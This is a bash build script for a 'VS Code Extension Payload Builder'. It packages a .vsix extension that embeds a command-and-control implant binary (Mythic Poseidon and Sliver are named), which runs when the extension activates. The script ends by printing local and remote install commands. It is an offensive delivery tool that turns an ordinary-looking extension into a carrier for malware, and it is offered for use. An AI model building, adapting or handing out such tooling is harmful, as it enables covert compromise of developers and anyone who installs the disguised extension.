#!/usr/bin/env bash
# =============================================================================
#  VS Code Extension Payload Builder
#  =============================================================================
#
#  Packages a VS Code extension (.vsix) that embeds a C2 payload binary.
#  The payload is deployed and executed when the extension activates.
#
#  USAGE
#    # Build with a specific payload binary:
#    PAYLOAD_SOURCE=/path/to/agent bash build_extension.sh
#
#    # Build with a payload already placed at ./payload/agent:
#    bash build_extension.sh
#
#  PREREQUISITES
#    - Node.js 18+ and npm
#    - vsce (auto-installed via npx — no global install needed)
#    - A compiled payload binary (e.g., Mythic Poseidon, Sliver implant, etc.)
#
#  OUTPUT
#    ./*.vsix  — the installable extension package
#
# =============================================================================

set -eu

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; BOLD='\033[1m'; NC='\033[0m'

info()  { echo -e "  ${BLUE}[INFO]${NC}  $1"; }
ok()    { echo -e "  ${GREEN}[OK]${NC}    $1"; }
warn()  { echo -e "  ${YELLOW}[WARN]${NC}  $1"; }
fail()  { echo -e "  ${RED}[FAIL]${NC}  $1"; exit 1; }

echo ""
echo -e "${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  VS Code Extension Payload Builder${NC}"
echo -e "${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
echo ""

# ── Step 1: Locate payload ───────────────────────────────────────────────────
PAYLOAD_SOURCE="${PAYLOAD_SOURCE:-}"

if [[ -z "$PAYLOAD_SOURCE" ]] && [[ -f "$SCRIPT_DIR/payload/agent" ]]; then
    PAYLOAD_SOURCE="$SCRIPT_DIR/payload/agent"
    info "Using payload already at: $PAYLOAD_SOURCE"
elif [[ -n "$PAYLOAD_SOURCE" ]]; then
    info "Payload source (from env): $PAYLOAD_SOURCE"
else
    warn "No payload specified."
    echo ""
    echo "  Set PAYLOAD_SOURCE env var:"
    echo "    PAYLOAD_SOURCE=/path/to/agent bash build_extension.sh"
    echo ""
    echo "  Or place your binary at: ./payload/agent"
    echo ""
    echo "  Building without embedded payload (use method=download in config.json)"
fi

if [[ -n "$PAYLOAD_SOURCE" ]] && [[ -f "$PAYLOAD_SOURCE" ]]; then
    PAYLOAD_SIZE=$(stat -f%z "$PAYLOAD_SOURCE" 2>/dev/null || stat -c%s "$PAYLOAD_SOURCE" 2>/dev/null)
    PAYLOAD_TYPE=$(file "$PAYLOAD_SOURCE" | head -1)
    ok "Payload: ${PAYLOAD_SIZE} bytes — ${PAYLOAD_TYPE}"

    info "Copying to ./payload/agent"
    mkdir -p "$SCRIPT_DIR/payload"
    cp "$PAYLOAD_SOURCE" "$SCRIPT_DIR/payload/agent"
    chmod +x "$SCRIPT_DIR/payload/agent"
    ok "Payload copied"
elif [[ -n "$PAYLOAD_SOURCE" ]] && [[ ! -f "$PAYLOAD_SOURCE" ]]; then
    fail "PAYLOAD_SOURCE file not found: $PAYLOAD_SOURCE"
fi

# ── Step 2: Check Node.js ────────────────────────────────────────────────────
info "Checking Node.js..."
command -v node >/dev/null 2>&1 || fail "Node.js not found. Install from https://nodejs.org/"
ok "Node.js: $(node --version)"

command -v npm >/dev/null 2>&1 || fail "npm not found."
ok "npm: $(npm --version)"

# ── Step 3: Verify extension files ───────────────────────────────────────────
info "Verifying extension structure..."
REQUIRED=("package.json" "extension.js" "README.md" "CHANGELOG.md" "LICENSE")
for f in "${REQUIRED[@]}"; do
    [[ -f "$SCRIPT_DIR/$f" ]] || fail "Missing: $f"
done
[[ -f "$SCRIPT_DIR/media/icon.png" ]] || warn "Missing media/icon.png (will use default)"
ok "Structure OK"

# ── Step 4: Read version ─────────────────────────────────────────────────────
VERSION=$(node -e "console.log(require('./package.json').version)")
NAME=$(node -e "console.log(require('./package.json').name)")
PUBLISHER=$(node -e "console.log(require('./package.json').publisher)")
VSIX_FILE="${NAME}-${VERSION}.vsix"
info "Extension: ${PUBLISHER}.${NAME} v${VERSION}"
info "Output: $VSIX_FILE"

# ── Step 5: Package ──────────────────────────────────────────────────────────
echo ""
info "Packaging with vsce..."
rm -f "$SCRIPT_DIR"/*.vsix 2>/dev/null

VSCE="npx --yes @vscode/vsce"
$VSCE package --no-yarn --no-dependencies 2>&1 || {
    warn "Retrying without --no-dependencies..."
    $VSCE package --no-yarn 2>&1 || fail "vsce package failed"
}

# ── Step 6: Verify ───────────────────────────────────────────────────────────
echo ""
if [[ -f "$SCRIPT_DIR/$VSIX_FILE" ]]; then
    SIZE=$(stat -f%z "$SCRIPT_DIR/$VSIX_FILE" 2>/dev/null || stat -c%s "$SCRIPT_DIR/$VSIX_FILE" 2>/dev/null)
    ok "Built: $VSIX_FILE (${SIZE} bytes)"
else
    VSIX_FOUND=$(ls "$SCRIPT_DIR"/*.vsix 2>/dev/null | head -1)
    [[ -n "$VSIX_FOUND" ]] || fail "No .vsix created"
    VSIX_FILE=$(basename "$VSIX_FOUND")
    ok "Built: $VSIX_FILE"
fi

# ── Summary ──────────────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}${BOLD}  BUILD COMPLETE${NC}"
echo -e "${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "  Output: $VSIX_FILE"
echo ""
echo "  Install (local):"
echo "    code --install-extension $VSIX_FILE --force"
echo ""
echo "  Install (remote):"
echo "    scp $VSIX_FILE user@host:/tmp/"
echo "    ssh user@host 'code --install-extension /tmp/$VSIX_FILE --force'"
echo ""
echo "  Install (VS Code GUI):"
echo "    Extensions -> ... -> Install from VSIX -> select $VSIX_FILE"
echo ""
